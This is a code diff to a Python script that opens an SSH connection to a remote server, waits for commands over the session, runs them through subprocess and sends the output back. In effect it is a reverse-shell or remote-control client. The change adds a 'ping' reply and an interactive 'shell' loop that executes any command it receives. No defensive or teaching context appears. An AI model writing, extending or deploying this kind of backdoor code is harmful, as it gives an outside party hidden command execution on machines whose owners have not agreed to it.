@@ -25,30 +25,36 @@ def process_exec(client_session, command):
         elif len(command_output.stdout.decode('utf-8')):
             client_session.send(command_output.stdout.decode('utf-8'))
         else:
-            client_session.send('[*] Process exited without output.')
+            client_session.send('Process exited without output')
     except subprocess.CalledProcessError as err:
         client_session.send(str(err))
 
+def shell(client_session):
+    while client_session.active and not client_session.closed:
+        command = client_session.recv(1024).decode('utf-8').split(" ")
+
+        if command[0] == "cd" and len(command[1]):
+            path = " ".join(command[1:])
+            os.chdir(path)
+            client_session.send(f'Path changed to: {path}')
+            return
+        elif command[0] == "getpath":
+            if platform.system() == "Windows":
+                process_exec(client_session, "cd")
+            else: process_exec(client_session, "pwd")
+        elif command[0] == "exit":
+            return
+        else:
+            process_exec(client_session, " ".join(command[0:]))
+
 def process_commands(client_session):
     command = client_session.recv(1024).decode('utf-8').split(" ")
-    if command[0] == "exec":
-        if command[1] == "cd" and len(command[2]):
-            os.chdir(" ".join(command[2:]))
-            client_session.send(f'[*] Path changed to: {" ".join(command[2:])}')
-            return
-        process_exec(client_session, " ".join(command[1:]))
-    elif command[0] == "getpath":
-        if platform.system() == "Windows":
-            process_exec(client_session, "cd")
-        else: process_exec(client_session, "pwd")
-    elif command[0] == "quit":
-        client_session.close()
-        raise Exception
-    elif command[0] == "exit":
-        client_session.close()
-        sys.exit()
+    if command[0] == "ping":
+        client_session.send("pong")
+    elif command[0] == "shell":
+        shell(client_session)
     else:
-        client_session.send('[!] Command not recognized.')
+        client_session.send("Command not found")
 
 #connect to the remote ssh server and recieve commands to be #executed and send back output
 def ssh_command(server_address, server_port, username, password):
@@ -67,11 +73,8 @@ def ssh_command(server_address, server_port, username, password):
     )
     #get ssh session
     client_session = client.get_transport().open_session()
-    if client_session.active and not client_session.closed:
-        #wait for command, execute and send result ouput
-        while True:
-            #use subprocess run with timeout of 30 seconds
-            process_commands(client_session)
+    while client_session.active and not client_session.closed:
+        process_commands(client_session)
     client_session.close()
     return
 
